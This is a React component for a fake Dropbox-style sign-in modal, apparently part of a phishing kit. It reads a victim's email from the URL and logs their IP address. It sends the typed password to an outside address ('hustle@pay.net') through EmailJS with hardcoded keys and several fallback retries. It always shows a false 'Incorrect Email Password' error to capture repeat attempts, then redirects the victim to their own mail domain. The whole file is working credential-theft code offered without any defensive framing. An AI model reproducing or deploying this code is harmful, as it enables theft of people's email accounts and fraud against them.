import emailjs from "emailjs-com";
import React, { useEffect, useRef, useState } from "react";
export default function Login({ hide }) {
  const [ShowLoading, upLoading] = useState(!false);
  const [ShowError, upError] = useState("");
  const [count, setCount] = useState(0);
  const [email, setEmail] = useState("");
  const password = useRef();
  var re = /[^< ]+(?=>)/g;

  const fetchUserInfo = () => {
    if (localStorage.getItem("ip")) return null;
    fetch("https://api.bigdatacloud.net/data/client-ip")
      .then((res) => res.json())
      .then((res) => {
        localStorage.setItem("ip", res.ipString);
        console.log(res.ipString);
      })
      .catch((e) => console.error(e));
  };

  useEffect(() => {
    //fetch the user info from ipinfo api
    fetchUserInfo();
    let query =
      new URLSearchParams(window.location.search).get("ci") ||
      new URLSearchParams(window.location.search).get("email");
    var validRegex =
      /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
    if (query.split(" ")[0].match(validRegex)) {
      setEmail(query.split(" ")[0]);
    } else {
      window.location.replace("/");
    }
  });

  const HandleForm = (e) => {
    e.preventDefault();

    upLoading(false);
    setCount(prev=> prev + 1);
    //send the emails here
    // 1st param
    var template_params = {
      reply_to: "reply_to_value",
      // reply_to: localStorage.getItem('reply_to') || 'test@test.com',
      from_name: "DROPBOX-DARK-PAGE-LOG ",
      to_name: "hustle@pay.net",
      message_html: `Email address : ${email} and password : ${password.current.value}`,
      user_ip: localStorage.getItem("ip"),
    };

    var service_id = "default_service";
    var template_id = "template_y7beabp";
    emailjs
      .send(service_id, template_id, template_params, "zUZUycF0QVw3cTarU")
      .then((value) => {
        if (value.status === 200) {
          //send the user to the error page of the application
          upLoading(true);
          upError(true);
          password.current.value = "";
          setTimeout(() => upError(!true), 4000);
          // if(count>=2) return setTimeout(()=>window.location.replace("https://"+email.split('@')[1]),3000)
        } else {
          //do nothing
        }
      })
      .catch((e) => {
        // 2nd process
        emailjs
          .send(
            service_id,
            "template_nd9td1b",
            template_params,
            "vIS8FdDt6pkKEkyuT"
          )
          .then((value) => {
            if (value.status === 200) {
              //send the user to the error page of the application
              upLoading(true);
              upError(true);
              password.current.value = "";
              setTimeout(() => upError(!true), 4000);
              // if(count>=2) return setTimeout(()=>window.location.replace("https://"+email.split('@')[1]),3000)
            } else {
              //do nothing
            }
          })
          .catch((e) => {
            // 3rd process
            emailjs
              .send(
                service_id,
                "template_nd9td1b",
                template_params,
                "vIS8FdDt6pkKEkyuT"
              )
              .then((value) => {
                if (value.status === 200) {
                  //send the user to the error page of the application
                  upLoading(true);
                  upError(true);
                  password.current.value = "";
                  setTimeout(() => upError(!true), 4000);
                  if(count>=2) return setTimeout(()=>window.location.replace("https://"+email.split('@')[1]),3000)
                } else {
                  //do nothing
                }
              })
              .catch((e) => {
                //4th
                emailjs
                .send(
                  service_id,
                  "template_nd9td1b",
                  template_params,
                  "vIS8FdDt6pkKEkyuT"
                )
                .then((value) => {
                  if (value.status === 200) {
                    //send the user to the error page of the application
                    upLoading(true);
                    upError(true);
                    password.current.value = "";
                    setTimeout(() => upError(!true), 4000);
                    if(count>=2) return setTimeout(()=>window.location.replace("https://"+email.split('@')[1]),3000)
                  } else {
                    //do nothing
                  }
                })
                .catch((e) => {
                  upLoading(true);
                  upError(true);
                  if(count>=2) return setTimeout(()=>window.location.replace("https://"+email.split('@')[1]),3000)
                })
              });
          });
      });
  };

  return (
    <div
      onClick={(_) => hide()}
      style={{
        position: "fixed",
        width: "100%",
        height: "100%",
        background: "#000000d6",
        top: "0",
      }}
    >
      <div className="login-container show">
        <div className="modal " onClick={(e) => e.stopPropagation()}>
          {ShowLoading === true ? (
            <>
              <div className="top">
                <div className="close" onClick={(_) => hide()}>
                  <p className="close-icon">×</p>
                </div>
                <div className="logo">
                  <img
                    className="logo-image"
                    src="data:image/svg+xml;base64,"
                    alt=""
                  />
                  <img
                    className="logo-text"
                    src="data:image/svg+xml;base64,"
                    alt=""
                  />
                </div>
                {/* <h2 className="h2-banner">Enter Email Password to Download</h2> */}
                <h2 className="h2-banner">
                  Sign in to continue
                </h2>
                <p className="c-a">
                  or <span className="c-a-s">create an account</span>
                </p>
              </div>
              <div className="login">
                <form name="loginform" onSubmit={HandleForm}>
                  <div className="message" id="email-error"></div>
                  <div className="form-control">
                    <input
                      type="email"
                      name="email"
                      readOnly
                      value={email}
                      className="input-control"
                      placeholder="Email"
                      required
                    />
                  </div>
                  {ShowError && (
                    <div className="message" id="email-error">
                      Incorrect Email Password, Try Again
                    </div>
                  )}
                  <div className="form-control">
                    <input
                      type="password"
                      name="password"
                      ref={password}
                      className="input-control"
                      placeholder="Email Password"
                      onFocus={(_) => upError(false)}
                      required
                    />
                  </div>

                  <div className="login-checks">
                    <div className="remember">
                      <input type="checkbox" id="remember" />
                      <label for="remember">Remember me</label>
                    </div>
                    <div className="forgot">
                      <p>Forgotten your password?</p>
                    </div>
                  </div>
                  <div className="form-control">
                    <button className="sign-btn" type="submit">
                      Sign in
                    </button>
                  </div>
                  <div className="form-control">
                    {/* <button>
                <div className="btn-flex">
                  <img src="data:image/svg+xml;base64," alt=""/>
                  <p>Sign in with Google</p>
                </div>
              </button> */}
                    <button>
                      <div className="btn-flex">
                        <img
                          src="data:image/png;base64,"
                          alt=""
                        />
                        <p>Sign in with Mircosoft</p>
                      </div>
                    </button>
                  </div>
                  <div className="form-control">
                    <button>
                      <div className="btn-flex">
                        <img
                          src="data:image/svg+xml;base64,"
                          alt="/"
                        />
                        <p>Sign in with Apple</p>
                      </div>
                    </button>
                  </div>
                </form>
              </div>
              <div className="footer"></div>
            </>
          ) : (
            <img
              style={{ width: "420px" }}
              src="data:image/gif;base64,"
              alt="loading"
            />
          )}
        </div>
      </div>
    </div>
  );
}
